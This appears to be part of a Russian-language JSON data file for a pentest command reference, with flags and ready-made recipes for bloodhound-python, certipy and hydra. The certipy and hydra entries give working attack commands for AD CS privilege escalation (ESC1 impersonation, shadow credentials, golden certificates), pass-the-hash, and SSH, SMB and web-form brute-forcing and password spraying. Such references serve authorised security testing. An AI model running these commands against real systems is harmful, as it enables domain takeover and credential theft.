+      "title": "bloodhound / bloodhound-python",
+      "subcategory": "сбор данных для графа AD",
+      "purpose": "bloodhound-python (BloodHound.py) — Python-инжестор: собирает с домена пользователей, группы, сессии, ACL, доверия и пути атаки в JSON для импорта в BloodHound. Не требует запуска на Windows — работает с Linux по сети.",
+      "install": "pipx install bloodhound-ce",
+      "binary": "bloodhound-python",
+      "target": "-ns {TARGET}",
+      "modes": [],
+      "groups": [
+        {
+          "name": "Цель и DNS",
+          "flags": [
+            { "flag": "-ns", "value": "{TARGET}", "desc": "DNS-сервер (обычно сам DC) — критично для резолва имён домена." },
+            { "flag": "-dc", "value": "dc01.domain.local", "desc": "Имя (FQDN) контроллера домена для запросов." },
+            { "flag": "-gc", "value": "dc01.domain.local", "desc": "Сервер глобального каталога." },
+            { "flag": "--dns-tcp", "desc": "Использовать TCP для DNS-запросов." },
+            { "flag": "-di", "desc": "Отключить автоопределение Global Catalog (--disable-autogc)." }
+          ]
+        },
+        {
+          "name": "Аутентификация",
+          "flags": [
+            { "flag": "-u", "value": "user@domain.local", "desc": "Имя пользователя (UPN)." },
+            { "flag": "-p", "value": "password", "desc": "Пароль." },
+            { "flag": "--hashes", "value": "LM:NT", "desc": "NT-хеш (или LM:NT) для Pass-the-Hash." },
+            { "flag": "-k", "desc": "Аутентификация через Kerberos." },
+            { "flag": "-d", "value": "domain.local", "desc": "Имя домена (обязательно)." },
+            { "flag": "--use-ldaps", "desc": "Использовать LDAPS (636) вместо LDAP." }
+          ]
+        },
+        {
+          "name": "Сбор данных",
+          "flags": [
+            { "flag": "-c", "value": "Default", "desc": "Методы сбора: Default, All, Group, LocalAdmin, Session, Trusts, ACL, ObjectProps, Container, RDP, DCOM, PSRemote, LoggedOn, DCOnly." },
+            { "flag": "-w", "value": "10", "desc": "Число рабочих потоков (--workers)." },
+            { "flag": "--auth-method", "value": "auto", "desc": "Метод аутентификации (auto/ntlm/kerberos)." }
+          ]
+        },
+        {
+          "name": "Вывод",
+          "flags": [
+            { "flag": "-op", "value": "prefix", "desc": "Префикс имён выходных файлов (--outputprefix)." },
+            { "flag": "--zip", "desc": "Упаковать собранные JSON в один zip-архив (удобно для импорта)." },
+            { "flag": "-v", "desc": "Подробный вывод." }
+          ]
+        }
+      ],
+      "recipes": [
+        { "cmd": "bloodhound-python -u user -p password -d domain.local -ns {TARGET} -c All --zip", "note": "Полный сбор данных и упаковка в zip для импорта в BloodHound." },
+        { "cmd": "bloodhound-python -u user@domain.local -p pass -d domain.local -dc dc01.domain.local -ns {TARGET} -c DCOnly", "note": "Тихий сбор только через DC (без обращения к каждому хосту)." },
+        { "cmd": "bloodhound-python -u user --hashes :NThash -d domain.local -ns {TARGET} -c All --zip", "note": "Сбор через Pass-the-Hash без пароля." },
+        { "cmd": "bloodhound-python -u user -p pass -d domain.local -ns {TARGET} -k -c All --use-ldaps", "note": "Сбор через Kerberos и LDAPS." }
+      ],
+      "notes": "-ns ОБЯЗАТЕЛЕН и должен указывать на DNS домена (обычно DC), иначе имена не зарезолвятся. -c All собирает всё кроме LoggedOn; DCOnly — самый тихий (только LDAP-запросы к DC). Для BloodHound CE ставь bloodhound-ce-python (формат вывода отличается от legacy). Импорт: zip-архив через веб-интерфейс. Альтернатива на Windows — SharpHound."
+    },
+    {
+      "title": "certipy",
+      "subcategory": "атаки на AD CS (ESC1-ESC16)",
+      "purpose": "Инструмент перечисления и эксплуатации AD Certificate Services. Находит уязвимые шаблоны сертификатов (ESC1-16), запрашивает и подделывает сертификаты, проводит NTLM-relay и Shadow Credentials для повышения привилегий и захвата учёток.",
+      "install": "pipx install certipy-ad",
+      "binary": "certipy",
+      "target": "-dc-ip {TARGET}",
+      "modes": [
+        { "name": "find", "desc": "Перечислить CA и шаблоны, найти уязвимости ESC.", "target": "-dc-ip {TARGET}" },
+        { "name": "req", "desc": "Запросить сертификат по шаблону у CA.", "target": "-dc-ip {TARGET}" },
+        { "name": "auth", "desc": "Аутентифицироваться по сертификату (PKINIT) → TGT/NT-хеш.", "target": "-dc-ip {TARGET}" },
+        { "name": "relay", "desc": "NTLM-relay на HTTP/RPC endpoint AD CS (ESC8/ESC11).", "target": "" },
+        { "name": "shadow", "desc": "Shadow Credentials — захват учётки через msDS-KeyCredentialLink.", "target": "-dc-ip {TARGET}" },
+        { "name": "forge", "desc": "Подделать сертификат при наличии приватного ключа CA (Golden Cert).", "target": "" }
+      ],
+      "groups": [
+        {
+          "name": "Аутентификация и подключение",
+          "flags": [
+            { "flag": "-u", "value": "user@domain.local", "desc": "Имя пользователя (UPN)." },
+            { "flag": "-p", "value": "password", "desc": "Пароль." },
+            { "flag": "-hashes", "value": "LM:NT", "desc": "NT-хеш (или LM:NT) для Pass-the-Hash." },
+            { "flag": "-k", "desc": "Аутентификация через Kerberos." },
+            { "flag": "-no-pass", "desc": "Не запрашивать пароль (с -k или при анонимном)." },
+            { "flag": "-dc-ip", "value": "{TARGET}", "desc": "IP контроллера домена." },
+            { "flag": "-ns", "value": "{TARGET}", "desc": "DNS-сервер (обычно DC)." },
+            { "flag": "-target", "value": "ca.domain.local", "desc": "Целевой хост (CA/сервер) для подключения." }
+          ]
+        },
+        {
+          "name": "find",
+          "flags": [
+            { "flag": "-vulnerable", "desc": "Показывать только уязвимые шаблоны (ESC).", "mode": "find" },
+            { "flag": "-enabled", "desc": "Только включённые (опубликованные) шаблоны.", "mode": "find" },
+            { "flag": "-stdout", "desc": "Вывести результат в консоль вместо файлов.", "mode": "find" },
+            { "flag": "-bloodhound", "desc": "Экспорт для BloodHound.", "mode": "find" },
+            { "flag": "-hide-admins", "desc": "Скрыть права админов в выводе (меньше шума).", "mode": "find" }
+          ]
+        },
+        {
+          "name": "req (запрос сертификата)",
+          "flags": [
+            { "flag": "-ca", "value": "DOMAIN-CA", "desc": "Имя центра сертификации (CA).", "mode": "req" },
+            { "flag": "-template", "value": "User", "desc": "Имя шаблона сертификата.", "mode": "req" },
+            { "flag": "-upn", "value": "administrator@domain.local", "desc": "Подставить UPN в SAN (ESC1 — выдать себя за другого).", "mode": "req" },
+            { "flag": "-dns", "value": "dc01.domain.local", "desc": "Подставить DNS в SAN.", "mode": "req" },
+            { "flag": "-sid", "value": "S-1-5-21-...-500", "desc": "Подставить SID в сертификат.", "mode": "req" },
+            { "flag": "-application-policies", "value": "Client Authentication", "desc": "Политики приложения (для ESC15).", "mode": "req" },
+            { "flag": "-out", "value": "cert", "desc": "Префикс имени файла для сохранения .pfx.", "mode": "req" }
+          ]
+        },
+        {
+          "name": "auth / shadow",
+          "flags": [
+            { "flag": "-pfx", "value": "cert.pfx", "desc": "Файл сертификата .pfx для аутентификации.", "mode": "auth" },
+            { "flag": "-username", "value": "administrator", "desc": "Имя пользователя для аутентификации по сертификату.", "mode": "auth" },
+            { "flag": "-domain", "value": "domain.local", "desc": "Домен для аутентификации.", "mode": "auth" },
+            { "flag": "-ldap-shell", "desc": "Открыть LDAP-shell после аутентификации.", "mode": "auth" },
+            { "flag": "-account", "value": "target$", "desc": "Целевая учётка для Shadow Credentials.", "mode": "shadow" }
+          ]
+        },
+        {
+          "name": "forge / relay",
+          "flags": [
+            { "flag": "-ca-pfx", "value": "ca.pfx", "desc": "Сертификат+ключ CA для подделки (Golden Certificate).", "mode": "forge" },
+            { "flag": "-subject", "value": "CN=Administrator", "desc": "Subject подделываемого сертификата.", "mode": "forge" },
+            { "flag": "-serial", "value": "1", "desc": "Серийный номер подделываемого сертификата.", "mode": "forge" },
+            { "flag": "-target", "value": "http://ca.domain.local", "desc": "Цель relay (protocol://host) для ESC8/ESC11.", "mode": "relay" },
+            { "flag": "-template", "value": "DomainController", "desc": "Шаблон для запроса при relay.", "mode": "relay" }
+          ]
+        }
+      ],
+      "recipes": [
+        { "cmd": "certipy find -u user@domain.local -p pass -dc-ip {TARGET} -vulnerable -stdout", "note": "Найти уязвимые шаблоны сертификатов (ESC) и вывести в консоль." },
+        { "cmd": "certipy req -u user@domain.local -p pass -dc-ip {TARGET} -ca DOMAIN-CA -template VulnTemplate -upn administrator@domain.local", "note": "ESC1: запросить сертификат с подменой UPN на админа." },
+        { "cmd": "certipy auth -pfx administrator.pfx -dc-ip {TARGET}", "note": "Аутентифицироваться сертификатом и получить TGT + NT-хеш админа." },
+        { "cmd": "certipy shadow auto -u user@domain.local -p pass -dc-ip {TARGET} -account target$", "note": "Shadow Credentials: захватить учётку и получить её NT-хеш автоматически." },
+        { "cmd": "certipy forge -ca-pfx ca.pfx -upn administrator@domain.local -subject 'CN=Administrator'", "note": "Подделать Golden Certificate при наличии ключа CA." }
+      ],
+      "notes": "Первый аргумент — подкоманда (find/req/auth/relay/shadow/forge/ca/cert/account/template/parse). Флаги пишутся с ОДНИМ дефисом (-dc-ip, -no-pass) в стиле impacket. Классический путь ESC1: find -vulnerable → req с -upn → auth. shadow auto делает add+auth+clear автоматически. Для relay (ESC8) DC-ip не нужен — цель задаётся через -target."
+    },
+    {
+      "title": "hydra",
+      "subcategory": "сетевой брутфорс логинов",
+      "purpose": "Быстрый параллельный брутфорсер сетевых служб: SSH, FTP, RDP, SMB, HTTP-формы, базы данных и десятки других протоколов. Перебирает логины и пароли по словарям против сервиса на цели.",
+      "install": "sudo apt install hydra",
+      "binary": "hydra",
+      "target": "{TARGET}",
+      "modes": [],
+      "groups": [
+        {
+          "name": "Логины и пароли",
+          "flags": [
+            { "flag": "-l", "value": "admin", "desc": "Один логин." },
+            { "flag": "-L", "value": "users.txt", "desc": "Файл со списком логинов." },
+            { "flag": "-p", "value": "password", "desc": "Один пароль." },
+            { "flag": "-P", "value": "rockyou.txt", "desc": "Файл со списком паролей." },
+            { "flag": "-C", "value": "combos.txt", "desc": "Файл с парами login:password (вместо -L/-P)." },
+            { "flag": "-e", "value": "nsr", "desc": "Доп. проверки: n — пустой пароль, s — пароль=логин, r — реверс логина." },
+            { "flag": "-u", "desc": "Перебирать сначала логины, потом пароли (по умолчанию наоборот)." }
+          ]
+        },
+        {
+          "name": "Цель и сервис",
+          "flags": [
+            { "flag": "-s", "value": "2222", "desc": "Нестандартный порт службы." },
+            { "flag": "-S", "desc": "Использовать SSL для подключения." },
+            { "flag": "-M", "value": "targets.txt", "desc": "Файл со списком целей (массовая атака)." },
+            { "flag": "-4", "desc": "Только IPv4." },
+            { "flag": "-6", "desc": "Только IPv6." }
+          ]
+        },
+        {
+          "name": "Скорость и контроль",
+          "flags": [
+            { "flag": "-t", "value": "16", "desc": "Число параллельных задач на цель (для SSH снижай до ~4)." },
+            { "flag": "-T", "value": "64", "desc": "Общее число параллельных коннектов (с -M)." },
+            { "flag": "-w", "value": "30", "desc": "Таймаут ожидания ответа (сек)." },
+            { "flag": "-f", "desc": "Остановиться после первой валидной пары login:password на хосте." },
+            { "flag": "-F", "desc": "Остановиться при первом успехе на любом из хостов (с -M)." }
+          ]
+        },
+        {
+          "name": "Вывод и сессия",
+          "flags": [
+            { "flag": "-o", "value": "found.txt", "desc": "Записать найденные креды в файл." },
+            { "flag": "-b", "value": "text", "desc": "Формат файла вывода: text, json, jsonv1." },
+            { "flag": "-V", "desc": "Показывать каждую пробу login:password (очень подробно)." },
+            { "flag": "-v", "desc": "Подробный вывод." },
+            { "flag": "-R", "desc": "Восстановить прерванную сессию из hydra.restore." },
+            { "flag": "-I", "desc": "Игнорировать файл восстановления (начать заново)." }
+          ]
+        },
+        {
+          "name": "Брутфорс пароля",
+          "flags": [
+            { "flag": "-x", "value": "6:8:a1", "desc": "Генерировать пароли: мин:макс:набор (a-буквы,1-цифры,!-спецсимволы)." }
+          ]
+        }
+      ],
+      "recipes": [
+        { "cmd": "hydra -l root -P rockyou.txt {TARGET} ssh -t 4", "note": "Брутфорс SSH одного пользователя (мало потоков, чтобы не падало)." },
+        { "cmd": "hydra -L users.txt -P passwords.txt {TARGET} ssh -f", "note": "Перебор пар логин/пароль по SSH, стоп при первой удаче." },
+        { "cmd": "hydra -l admin -P rockyou.txt {TARGET} http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'", "note": "Брутфорс HTTP-формы: ^USER^/^PASS^ — поля, F= — строка-признак неудачи." },
+        { "cmd": "hydra -L users.txt -p 'Password1' {TARGET} smb", "note": "Password spray одного пароля по списку пользователей через SMB." },
+        { "cmd": "hydra -l admin -P rockyou.txt -s 3306 {TARGET} mysql", "note": "Брутфорс MySQL на нестандартном порту." }
+      ],
+      "notes": "Синтаксис: hydra [опции] цель сервис [параметры модуля]. Цель — позиционно (предпоследний аргумент), сервис — последний (ssh, ftp, smb, rdp, mysql, http-post-form, http-get…). Для http-post-form формат «путь:тело:признак»: ^USER^/^PASS^ — плейсхолдеры, F=строка — признак неудачи, S=строка — признак успеха. Для SSH держи -t ≤ 4. Справка по модулю: hydra -U http-post-form."
+    }
+  ]
+}
